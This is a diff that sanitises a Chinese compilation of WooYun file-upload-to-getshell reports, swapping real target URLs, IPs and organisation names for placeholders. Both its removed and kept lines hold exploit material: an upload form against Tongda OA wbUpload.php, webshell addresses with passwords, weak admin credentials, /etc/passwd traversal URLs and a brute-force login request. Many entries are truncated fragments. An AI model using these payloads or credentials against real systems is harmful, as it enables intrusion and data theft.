@@ -25,7 +25,7 @@
 **标题**: 上海地铁存在任意文件上传漏洞可Shell
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://service.shmetro.com/ihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201504/20150416200...`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
@@ -39,7 +39,7 @@
   ```
 
 ### 案例 2: wooyun-2015-0135258
-**标题**: 上海公交集团—协同门户fck文件上传至getshell
+**标题**: 某单位存在安全漏洞—协同门户fck文件上传至getshell
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **参数**: `Connector`
 **洞察提取**:
@@ -59,7 +59,7 @@
 **洞察提取**:
 
 ### 案例 4: wooyun-2014-064558
-**标题**: 长沙岳麓区教育局教育云平台任意文件上传导致GETSHELL
+**标题**: 某单位存在安全漏洞教育云平台任意文件上传导致GETSHELL
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **洞察提取**:
 
@@ -67,17 +67,17 @@
 **标题**: 多玩某分站任意文件上传
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://gm2.duowan.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/duowan/20101205/x1.jsp`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - http://gm2.duowan.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/duowan/20101205/x1.jsp ninty我去年上传的，貌似漏洞被补了？我刚才又没传成功，如果你们没动，漏洞应该就还在
+  - https://example.com/[已脱敏] ninty我去年上传的，貌似漏洞被补了？我刚才又没传成功，如果你们没动，漏洞应该就还在
 
 ### 案例 6: wooyun-2014-068939
 **标题**: 一比多上传漏洞导致网站沦陷
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://www.ebdoor.com/`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 企业登陆后，在发布产品页面，“相关图片”上传模块存在漏洞，尽在浏览器端限制文件上传类型，黑客可以通过手动提交数据包方式绕过限制上传webshell，取得网站及数据库权限，可能导致大量企业用户数据泄露。深入渗透后果将不堪设想。http://www.ebdoor.com/
+  - 企业登陆后，在发布产品页面，“相关图片”上传模块存在漏洞，尽在浏览器端限制文件上传类型，黑客可以通过手动提交数据包方式绕过限制上传webshell，取得网站及数据库权限，可能导致大量企业用户数据泄露。深入渗透后果将不堪设想。https://example.com/[已脱敏]
 **Payload片段**:
   ```
   or.com/ 
@@ -87,16 +87,16 @@
 **标题**: 融资城某分站任意命令执行漏洞
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://english.352.com/harborII/presentWebAction!queryPresentRegion.dox贵公司主站也是struts2的架构，建议对全业务线都检查一...`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - http://english.352.com/harborII/presentWebAction!queryPresentRegion.dox贵公司主站也是struts2的架构，建议对全业务线都检查一下，同时对服务器是否存在后面进行全面排查。
+  - https://example.com/[已脱敏]
 **Payload片段**:
   ```
   orII/presentWebAction!queryPresentRegion.dox贵公司主站也是s
   ```
 
 ### 案例 8: wooyun-2016-0167456
-**标题**: 上海市银行同业公会某系统Getshell/涉及近200家银行相关单位/影响内网安全
+**标题**: 某单位存在安全漏洞同业公会某系统Getshell/涉及近200家银行相关单位/影响内网安全
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
   - `http://**.**.**.**根据WooYun-2015-137850，%00截断拿到shellhttp://**.**.**.**/car/a.jsp数据库配置文件影响近200家银行文件泄露可...`
@@ -108,18 +108,18 @@
 **标题**: 奥鹏培训网后台弱口令可getshell
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://www.ourteacher.com.cn/admin/，进入后台可上传ashx文件，利用ashx生成asp，可写入任意代码`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 后台地址http://www.ourteacher.com.cn/admin/，进入后台可上传ashx文件，利用ashx生成asp，可写入任意代码
+  - 后台地址https://example.com/[已脱敏]
 
 ### 案例 10: wooyun-2015-097954
 **标题**: 搜房网某后台系统存遍历可getshell
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 **URL示例**: 
-  - `http://news.liupanshui.fang.com/fck低版本的遍历漏洞`
+  - `https://example.com/[已脱敏]`
 
 ### 案例 11: wooyun-2015-0126641
-**标题**: 重庆文理学院就业办官网某处上传漏洞致该校多站点包括主站服务器被控
+**标题**: 某单位存在安全漏洞就业办官网某处上传漏洞致该校多站点包括主站服务器被控
 **原始类型**: 漏洞类型：文件上传导致任意代码执行
 
 
@@ -157,23 +157,23 @@
 #### wooyun-2014-077990
 **中海石油某站任意文件上传&某系统弱口令**
 - 洞察:
-  - mail.coes.org.cn通过u-mail查看任意用户密码上传一句话http://mail.coes.org.cn/webmail/client/cache/324/14120865545.jpg/1.php 密码xiaohttp://www.coes.org.cn/rollbook/default.aspadmin/admin
-- Payload: `org.cn通过u-mail查看任意用户密码上传一句话http://mail.coes.org.cn/w`
+  - mail.coes.org.cn通过u-mail查看任意用户密码上传一句话https://example.com/[已脱敏] 密码xiaohttps://example.com/[已脱敏]
+- Payload: `org.cn通过u-mail查看任意用户密码上传一句话https://example.com/[已脱敏]`
 
 #### wooyun-2013-036758
 **杭州杭景科技平台型网上订餐系统漏洞波及官网及几十家客户**
 - 洞察:
-  - 1，上传漏洞地址：http://www.ihangjing.com/admin/upfile/Upload.html?Links只在前端过滤。后台没有做过滤处理。2，弱口令1：admin  123456弱口令2：jijunjian   123456其他账号口令多是123456  可暴力破解
+  - 1，上传漏洞地址：https://example.com/[已脱敏]  123456弱口令2：jijunjian   123456其他账号口令多是123456  可暴力破解
 
 #### wooyun-2013-022789
-**中国电信某分站任意文件上传与webshell执行**
+**某运营商某分站任意文件上传与webshell执行**
 - 洞察:
-  - 首先通过网站跟目录下的http://client31.v.vnet.mobi/info.php找到网站根目录，然后访问http://client31.v.vnet.mobi/images/upload.php，直接指定目录，上传php大马。
+  - 首先通过网站跟目录下的https://example.com/[已脱敏]
 
 #### wooyun-2015-0105319
-**中国联通wo某业务门户网站Struts命令执行漏洞直接Getshell**
+**某运营商wo某业务门户网站Struts命令执行漏洞直接Getshell**
 - 洞察:
-  - Struts 上穿漏洞直接getshellhttp://im.wo.com.cn/webportal//loginSp/userLogin.action
+  - Struts 上穿漏洞直接getshellhttps://example.com/[已脱敏]
 - Payload: `ortal//loginSp/userLogin.action `
 
 ---
@@ -199,19 +199,19 @@
 - Payload: `$("fm_file").value=="")06       `
 
 #### wooyun-2015-0141569
-**运营商安全之中国联通增值业务平台系统GETSHELL**
+**运营商安全之某运营商增值业务平台系统GETSHELL**
 - Payload: `;Initial Catalog=ivr;Persist Se`
 
 #### wooyun-2014-066758
-**用友某微信平台命令执行漏洞权限较大**
+**用友某某互联网公司平台命令执行漏洞权限较大**
 - 洞察:
-  - http://comp.yonyou.com//shell.jsp 密码test漏洞地址 http://comp.yonyou.com/hr/sm/Sm_index.action;jsessionid=BD01456221D66A12061773C6EE4315D0
+  - https://example.com/[已脱敏] 密码test漏洞地址 https://example.com/[已脱敏]
 - Payload: `;jsessionid=BD01456221D66A12061`
 
 #### wooyun-2015-0131862
 **中国华能集团公司某子公司子站JBOSS配置不当导致getshell**
 - 洞察:
-  - 漏洞地址：http://ebs.chnzb.cn/jmx-console模块未删除导致远程上传war包getshell上传war包证明：获得shell，密码023
+  - 漏洞地址：https://example.com/[已脱敏]
 
 #### wooyun-2015-0143816
 **中国山东政府采购网站上传漏洞可直接getshell**
@@ -246,7 +246,7 @@
 
 #### wooyun-2015-0120939
 **上海鼎创通用型数字校园系统11处任意文件上传漏洞**
-- Payload: `UnionBlog/ftb.imagegallery.aspxhttp://www.hsyr.pudong-e`
+- Payload: `UnionBlog/ftb.imagegallery.aspxhttps://example.com/[已脱敏]`
 
 #### wooyun-2014-081607
 **某港船载货物管理系统任意文件上传漏洞**
@@ -256,7 +256,7 @@
 **漏洞类型**: 文件上传导致任意代码执行
 
 **元思考**: 
-- 触发点：http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com...
+- 触发点：https://example.com/[已脱敏]
 - 攻击者视角：寻找文件上传导致任意代码执行相关的入口点
 
 **洞察**: 
@@ -269,10 +269,10 @@
 3. 观察响应差异
 
 **利用方法**: 
-- 详情：http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html编辑器上传漏洞 http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.os
+- 详情：https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: 
-编辑器上传漏洞 http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html
+编辑器上传漏洞 https://example.com/[已脱敏]
 
 **修复建议**: 比我懂 ==  高分吗
 
@@ -290,9 +290,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.dld.com/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
+**详情**: https://example.com/[已脱敏] enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
 
-**POC**: 一句话地址:http://oa.dld.com//general/vmeet/wbUpload/test.php好像是system权限,因为我可以删system32里面的东西.膜拜大黑阔！！！超级无敌后门删不掉,运维叔叔记得重装备份一下重装系统啊,不然你懂的再送几张在system32里面分析的几个文件吧里面的w3wp.exemicrox.exe还有microsft.exe 和system.exe应该还有
+**POC**: 一句话地址:https://example.com/[已脱敏] 和system.exe应该还有
 
 **绕过**: 直接利用
 
@@ -334,7 +334,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Fckeditor编辑器漏洞啊··http://xxcj.sasac.gov.cnhttp://xxcj.sasac.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector直接上传JSP木马·取得权限
+**详情**: Fckeditor编辑器漏洞啊··https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -358,7 +358,7 @@
 
 **详情**: 之前把漏洞上报在了cnvd，应cnvd要求把该漏洞上报至wooyun来。
 
-**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站http://www.google.com.hk/search?hl=zh-Hans-HK&source=hp&q=comm_front%2Femail%2F&gbv=2&oq=comm_front%2Femail%2F&gs_l=heirloom-hp.12...15360.15360.0.16453.1.1.0.0.0.0.0.0..0.0.
+**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -402,7 +402,7 @@
 
 **详情**: 美的官方某分站上传漏洞
 
-**POC**: 美的集团真是什么都做啊，还做小额贷款http://202.104.30.185/http://202.104.30.185/adminfckeditor漏洞，遍历目录http://202.104.30.185/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/..fckeditor可直接上传任意格式GETWebshellhttp://202.104.30.185/UserFiles//Image/ind.js
+**POC**: 美的集团真是什么都做啊，还做小额贷款http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -411,7 +411,7 @@
 
 ---
 ### [wooyun-2014-072038] 李宁官网被解析html用来做游戏私服
-**厂商**: http://www.li-ning.com.cn/ | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+**厂商**: https://example.com/[已脱敏] | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -422,7 +422,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址http://www.li-ning.com.cn/uploadfile/07029/2014072945099.html这私服也太刁了吧....
+**详情**: 地址https://example.com/[已脱敏]
 
 **POC**: 哎，快通知官网联系此私服管理追究责任吧...
 
@@ -444,7 +444,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在问题的站点：http://legc.lenovo.com/1.上传头像处对过滤不严导致可上传任意文件：2.好在上传的文件和web应用进行了分离无法直接利用，但是这样却导致了另外一个问题，任意文件下载，上传数据后，我们抓到这样一个请求；3.于是我们传入这样一个参数“/etc/passwd”;http://legc.lenovo.com/lefactory/static-content?contentPath=/etc/passwd
+**详情**: 存在问题的站点：https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -466,9 +466,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 任意地址跳转：http://big5.csair.com/SuniT/www.baidu.com/index.htmlhttp://big5.csair.com/SuniT/fish.cccsair.com/钓鱼.html任意文件上传：http://olcs2.csair.com/upload.php已经上传不确定文件位置。
+**详情**: 任意地址跳转：https://example.com/[已脱敏]
 
-**POC**: 文件下载：http://www.csair.com/en/tourguide/before_ready/destination/download/download.php?FileName=download.phphttp://www.csair.com/en/tourguide/before_ready/destination/download/download.php?FileName=../../../../../../../../../../../../../../../../etc/passwd
+**POC**: 文件下载：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -488,9 +488,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞页面:http://xiuxiu.huodong.meitu.com/0408/#rd后台上传程序未对后缀做判断.POST / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere
+**详情**: 漏洞页面:https://example.com/[已脱敏] / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere
 
-**POC**: 直接打开就是证明:http://mtapplet.meitudata.com/.
+**POC**: 直接打开就是证明:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -510,9 +510,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.http://ydxuexi.cnsuning.com/clp/redirectLogin.htm内部云店学习平台无验证码，后端也没有放爆破机制看了下源文件if (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工
+**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.https://example.com/[已脱敏] (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工
 
-**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似QQ和微信的软件。里面有企业所有的组织架构，员工联系方
+**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似某互联网公司和某互联网公司的软件。里面有企业所有的组织架构，员工联系方
 
 **绕过**: 直接利用
 
@@ -532,9 +532,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标系统：http://www.fjccs.com.cn:8801/fjccsadmin/系统登录框存在注入POST http://www.fjccs.com.cn:8801/fjccsadmin/login.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.fjccs.com.cn:8801/fjccsadmin/login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl
+**详情**: 目标系统：https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏] zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl
 
-**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：http://www.fjccs.com.cn:8801/fjccsadmin/upfiles/seal/A0000494wooyun.aspx密码：abcd
+**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -554,7 +554,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 泄漏数据库地址http://chaoshi.12t.cnhttp://chaoshi.12t.cn/include/upload.php  修改上传源码
+**详情**: 泄漏数据库地址https://example.com/[已脱敏]  修改上传源码
 
 **POC**: 莫非传说中的两千万开房数据就是这样来的?
 
@@ -642,9 +642,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及百度到的学号密码：123456000000以及百度到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get
+**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及某搜索引擎到的学号密码：123456000000以及某搜索引擎到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get
 
-**POC**: 以东华理工大学为例：（theol_student/123456）http://eol.ecit.cn/eol/homepage/common/opencourse/访问地址：http://eol.ecit.cn/eol/data/jpk/0/1.jspPOST http://eol.ecit.cn/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://eol.ecit.cn/eol/popups/jpkrecord/upload_file.jsp
+**POC**: 以东华理工大学为例：（theol_student/123456）https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -664,7 +664,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网http://xiezi.foundertype.com/让我拾起了写字的热情 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：http://xiezi.foundertype.com/MrWrite2SIM/xml/20150420192358.asp 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到
+**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网https://example.com/[已脱敏] 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：https://example.com/[已脱敏] 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到
 
 **POC**: (见原文)
 
@@ -686,7 +686,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这里可以遍历目录http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/任意上传马http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.jsp?type=bszn上一句话成功3389一改 netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器
+**详情**: 这里可以遍历目录http://[IP已脱敏] netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器
 
 **POC**: 进入服务器
 
@@ -710,7 +710,7 @@
 
 **详情**: AD：NewEtone国际长途电话卡可以从全球各地拨打电话，并且话费低廉、语音质量好。主站和管理系统均存在struts漏洞，配置文件泄露多个数据库配置等大量敏感信息。用户信息和电话卡信息还有各种交易信息等等诸多信息大量侧漏。用户密码明文存储。
 
-**POC**: 主站地址：http://www.newetone.com/后台地址：http://www.newetone.com:8080/均存在struts漏洞网站首页截图主站有过滤，shell直接废了管理后台未过滤，马儿活着，配置文件截图，大量敏感信息侧漏一个账号导致多个数据库侧漏用户密码直接明文大量订单信息侧漏然后某些卡的信息验证下，成功只进了一个库瞅了几眼，其他的库没进去看，目测数据量不小。裤子什么的没动，厂商尽快修复吧，不然，各种vip。。。。。呵呵。。。。最后弱弱的问一句：咱能不用明文么？？？要不要给发个VIP啥的
+**POC**: 主站地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -732,7 +732,7 @@
 
 **详情**: 你懂的。
 
-**POC**: http://z.duowan.com/ucenter/data/tmp/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -752,9 +752,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html
+**详情**: 此处存在任意上传https://example.com/[已脱敏]
 
-**POC**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html
+**POC**: 此处存在任意上传https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -774,7 +774,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传未做任何过滤上传点：http://www.whcits.com/xieyou.aspx
+**详情**: 上传未做任何过滤上传点：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -796,7 +796,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海人，对这个瞄了很久http://www.shyule.org/看了一下旁站，仔细寻找，终于............http://www.bio-tag.com.cn/ftb.imagegallery.aspx可以直接上传一句话没有任何防护，直接提权我没有添加用户，而是替换了shift为任务管理器后门211.152.45.195:12367shift5下调出后门进入里面有不少重要的网站，和部分数据库例举其中几个网站吧乱七八糟的都有当是我的目标是数据库打开web.config发现是智库分离ip指向116.228.40.12是上海市电信的直接打开发现试试8080端口好吧到处结束吧实在没法深入了也懒得深入了求10rank买个T恤跪谢
+**详情**: 上海人，对这个瞄了很久https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -818,7 +818,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.141.228.206/admin admin 直接登录
+**详情**: http://[IP已脱敏] admin 直接登录
 
 **POC**: (见原文)
 
@@ -864,7 +864,7 @@
 
 **详情**: web.xml配置得有session过滤器，只有白名单内的url放行，没有登录的话会强制跳转到登录页面。SELECT  SECU_URL FROM  EZ_SECU_PAGELIST  WHERE LIST_TYPE=1从数据库中可以得到一份白名单URL:挑几个感兴趣的来看。0x1 任意文件上传 url: /UploadServlet最后上传的文件路径就是: uploadFolder/path/fileId.substring(0, 6)/fileId，path和fileId两个参数可控，所以可以上传任意文件了官方demo演示:0x2 xfire xml实体注入webservice使用了xfire框架，存在xxe漏洞jmx-console 存在默认口令: admin/ezoffice，网上搜一下基本没改。0x3 SQL注射webservice服务需要一个通信密码，但官方自己留了一个万能密码
 
-**POC**: http://**.**.**.**:7055/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test/123456/123456.jspx
+**POC**: http://**.**.**.**:7055/defaultroothttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -886,7 +886,7 @@
 
 **详情**: 
 
-**POC**: http://www.wengyuan.gov.cn/website/deptwebsite/0180/Content.jsp?issueId=12483&msgType=00&filePath=/WEB-INF/web.xmlhttp://www.wengyuan.gov.cn//portal/admin/issue/InsertTitleImage.jsphttp://jw.meizhou.gov.cn/portal/admin/issue/InsertTitleImage.jsphttp://59.39.89.121//portal/admin/issue/InsertTitleImag
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -906,9 +906,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某建设工程质量监督系统任意文件上传。案例：http://www.jljszj.gov.cn/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://218.7.239.170:81/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://www.thszjz.com/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://www.ccjdw.com/PKPMBS/common/https://wooyun-img.oss-c
+**详情**: 某建设工程质量监督系统任意文件上传。案例：https://example.com/[已脱敏]
 
-**POC**: 证明如下：http://www.jljszj.gov.cn/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspx存在任意文件上传，直接上传aspx文件，上传后文件不改名，如下所示：文件路径获取：可getshell:
+**POC**: 证明如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -928,9 +928,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.shenzhenly.cn/Fckeditor/editor/filemanager/connectors/test.htmlfckeeditor没有阉割到位 还是可以利用解析来二次上传来获得一句话
+**详情**: https://example.com/[已脱敏] 还是可以利用解析来二次上传来获得一句话
 
-**POC**: http://www.shenzhenly.cn/Fckeditor/editor/filemanager/connectors/test.html解析的格式ali.asp;ali(2).jpg 这样的系统第一次解析是失败。连续是上传两次可以获得一句话在菜刀里面我发现这网站已经被菠菜了管理员请重视一下你的网站运营不然我们怎么放心的去旅游呢存不存在数据库不在深入点到为止 网站备份打包拿走请好好维护....
+**POC**: https://example.com/[已脱敏]).jpg 这样的系统第一次解析是失败。连续是上传两次可以获得一句话在菜刀里面我发现这网站已经被菠菜了管理员请重视一下你的网站运营不然我们怎么放心的去旅游呢存不存在数据库不在深入点到为止 网站备份打包拿走请好好维护....
 
 **绕过**: 直接利用
 
@@ -950,9 +950,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: UR;http://www.sdjs.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1仍然使用的老版本系统，此版本还存在注入。
+**详情**: UR;https://example.com/[已脱敏]
 
-**POC**: UR;http://www.sdjs.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1仍然使用的老版本系统
+**POC**: UR;https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -996,7 +996,7 @@
 
 **详情**: 按说是一个老的漏洞了,今天好奇从官网上下载了一个新版的通达oa系统,安装测试了一下发现上传点依旧存在
 
-**POC**: 产品更新时间2013年7月16日查看目录结构是否还存在漏洞文件继续使用以前的exp:<form enctype="multipart/form-data" action="http://127.0.0.1/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>测试上传一个文件
